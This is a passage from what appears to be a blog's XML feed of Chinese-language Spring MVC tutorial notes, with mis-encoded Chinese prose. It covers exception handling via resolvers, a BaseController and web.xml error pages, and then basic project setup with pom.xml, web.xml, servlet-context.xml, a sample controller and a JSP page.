class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>error.jsp</code>ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>${ex}</code>åœ¨å‰ç«¯é¡µé¢æ‰“å°å¼‚å¸¸ä¿¡æ¯ã€‚</p><p>æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸æŠ›å‡ºå¹¶å®šä½åˆ°ç›¸åº”é¡µé¢</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- è®¾ç½®è‡ªå®šä¹‰å¼‚å¸¸å’Œé¡µé¢çš„æ˜ å°„ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionMappings&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;path.to.your.exception1&quot;</span>&gt;</span>exception1<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;path.to.your.exception2&quot;</span>&gt;</span>exception2<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®æˆåŠŸè‹¥æŠ›å‡º<code>exception1</code>åˆ™ä¼šè·³è½¬åˆ°<code>exception1.jsp</code>é¡µé¢</p><h3 id="å®ç°HandlerExceptionResolveræ¥å£"><a href="#å®ç°HandlerExceptionResolveræ¥å£" class="headerlink" title="å®ç°HandlerExceptionResolveræ¥å£"></a>å®ç°<code>HandlerExceptionResolver</code>æ¥å£</h3><p>æ¥å£å®šä¹‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest request, HttpServletResponse response, <span class="meta">@Nullable</span> Object handler, Exception ex)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™å¤„ç†ç±»ï¼Œä½¿ç”¨<code>@Component</code>å¯¼å…¥IOCå®¹å™¨ï¼Œä¸å¼‚å¸¸ç»‘å®š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionResolver</span> <span class="keyword">implements</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object handler, Exception ex )</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        mv.addObject(<span class="string">&quot;ex&quot;</span>, <span class="string">&quot;Error Message&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ifåˆ¤æ–­è®¾ç½®è‡ªå®šä¹‰å¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionResolver</span> <span class="keyword">implements</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object handler, Exception ex )</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;ex&quot;</span>, <span class="string">&quot;Error Message&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(ex <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">            mv.setViewName(<span class="string">&quot;IOExceptionPage&quot;</span>);</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> (IOException) ex;</span><br><span class="line">            mv.addObject(<span class="string">&quot;ex&quot;</span>,e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Controllerç±»ç»§æ‰¿BaseController"><a href="#Controllerç±»ç»§æ‰¿BaseController" class="headerlink" title="Controllerç±»ç»§æ‰¿BaseController"></a>Controllerç±»ç»§æ‰¿<code>BaseController</code></h3><p>ä½œä¸ºå…¶ä»– Controller çš„çˆ¶ç±»ï¼Œæä¾›å…¬å…±çš„å¼‚å¸¸å¤„ç†ã€æ—¥å¿—è®°å½•ã€æƒé™æ£€æŸ¥ç­‰æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseController</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exc</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Exception ex)</span> &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;ex&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> ParamsException) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error_param&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> BusinessException) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error_business&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>@ExceptionHandler</code> æ³¨è§£å®ç°å¼‚å¸¸å¤„ç†ï¼Œå…·æœ‰é›†æˆç®€å•ã€æœ‰æ‰©å±•æ€§å¥½ï¼ˆåªéœ€è¦å°†è¦å¼‚å¸¸å¤„ç†çš„ Controller ç±»ç»§æ‰¿äº <code>BaseController</code> å³å¯ï¼‰ã€ä¸éœ€è¦é™„åŠ  Spring é…ç½®ç­‰ä¼˜ç‚¹ï¼Œä½†è¯¥æ–¹æ³•å¯¹å·²æœ‰ä»£ç å­˜åœ¨å…¥ä¾µæ€§ï¼ˆéœ€è¦ä¿®æ”¹å·²æœ‰ä»£ç ï¼Œä½¿ç›¸å…³ç±»ç»§æ‰¿äº BaseControllerï¼‰ï¼Œåœ¨å¼‚å¸¸å¤„ç†æ—¶ä¸èƒ½è·å–é™¤å¼‚å¸¸ä»¥å¤–çš„æ•°æ®</p><h3 id="æœªæ•è·å¼‚å¸¸å¤„ç†"><a href="#æœªæ•è·å¼‚å¸¸å¤„ç†" class="headerlink" title="æœªæ•è·å¼‚å¸¸å¤„ç†"></a>æœªæ•è·å¼‚å¸¸å¤„ç†</h3><p>æœªæ•è·å¼‚å¸¸å¯¼è‡´çš„404ã€500ç­‰é”™è¯¯é¡µé¢å¯é€šè¿‡ä¿®æ”¹<code>web.xml</code>è¿›è¡Œå…¨å±€çš„é…ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å‡ºé”™é¡µé¢å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVCç¬¬ä¸€éƒ¨åˆ†</title>
      <link href="/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringMVCç¬¬ä¸€éƒ¨åˆ†"><a href="#SpringMVCç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="SpringMVCç¬¬ä¸€éƒ¨åˆ†"></a>SpringMVCç¬¬ä¸€éƒ¨åˆ†</h1><p>MVC( Model-View-Controller )æ˜¯ä¸€ç§ç¨‹åºè®¾è®¡æ€æƒ³ï¼Œé€šè¿‡åˆ†ç¦»æ¨¡å‹ã€è§†å›¾å’Œæ§åˆ¶å™¨åœ¨åº”ç”¨ä¸­çš„è§’è‰²å®ç°è§£è€¦ï¼ŒMVCå…è®¸å„ä¸ªç»„åˆ†å•ç‹¬æ”¹å˜è€Œä¸ä¼šç›¸äº’å½±å“</p><br/><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="é…ç½®æµç¨‹"><a href="#é…ç½®æµç¨‹" class="headerlink" title="é…ç½®æµç¨‹"></a>é…ç½®æµç¨‹</h3><p>é…ç½®ä¾èµ–é¡¹ä¸æ„å»ºé¡¹<code>pom.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- spring web --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- spring mvc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- web servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ç¼–è¯‘ç¯å¢ƒæ’ä»¶ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jettyæ’ä»¶ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.4.27.v20200227<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scanIntervalSeconds</span>&gt;</span>10<span class="tag">&lt;/<span class="name">scanIntervalSeconds</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- è®¾ç½®ç«¯å£ --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- è®¾ç½®é¡¹ç›®è·¯å¾„ --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">webAppConfig</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/path<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">webAppConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®<code>web.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">&quot;webApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ç¼–ç è¿‡æ»¤ utf-8 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>char encoding filter<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- servletè¯·æ±‚åˆ†å‘å™¨ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:servlet-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è¡¨ç¤ºå¯åŠ¨å®¹å™¨æ—¶åˆå§‹åŒ–è¯¥Servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è¿™æ˜¯æ‹¦æˆªè¯·æ±‚ï¼Œ &quot;/&quot;ä»£è¡¨æ‹¦æˆªæ‰€æœ‰è¯·æ±‚ï¼Œ &quot;*.do&quot;æ‹¦æˆªæ‰€æœ‰.doè¯·æ±‚ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;url-pattern&gt;/&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>servletè¯·æ±‚åˆ†å‘ç”±<code>servlet-context.xml</code>é…ç½®ï¼Œæ¥ä¸‹æ¥é…ç½®è¯¥æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å¯æ‰«æå™¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.xxxx.springmvc.controller&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- ä½¿ç”¨é»˜è®¤çš„Servletæ¥å“åº”é™æ€æ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- å¼€å¯æ³¨è§£é©±åŠ¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- é…ç½®è§†å›¾è§£æå™¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span> <span class="attr">id</span>=<span class="string">&quot;internalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- å‰ç¼€ï¼šåœ¨WEB-INFç›®å½•ä¸‹çš„jspç›®å½•ä¸‹ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- åç¼€ï¼šä»¥.jspç»“å°¾çš„èµ„æº --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h3><p>ç¼–å†™é¡µé¢æ§åˆ¶å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚æ˜ å°„åœ°å€ /hello.do</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;hello spring mvc&quot;</span>);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>WEB-INF</code>ç›®å½•ä¸‹æ–°å»º<code>jsp</code>æ–‡ä»¶å¤¹ï¼Œæ–°å»º<code>hello.jsp</code></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> </span><br><span class="line">        request.getScheme() + <span class="string">&quot;://&quot;</span> + </span><br><span class="line">        request.getServerName() + <span class="string">&quot;:&quot;</span> + </span><br><span class="line">        request.getServerPort() + path + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;My JSP <span class="string">&#x27;hello.jsp&#x27;</span> starting page&lt;/title&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;expires&quot;</span> content=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;This is my page&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- ELè¡¨è¾¾å¼æ¥æ”¶å‚æ•°å€¼ --&gt;</span><br><span class="line">    $&#123;hello&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨jettyæœåŠ¡å™¨å³å¯</p><br/><h2 id="URLåœ°å€æ˜ å°„"><a href="#URLåœ°å€æ˜ å°„" class="headerlink" 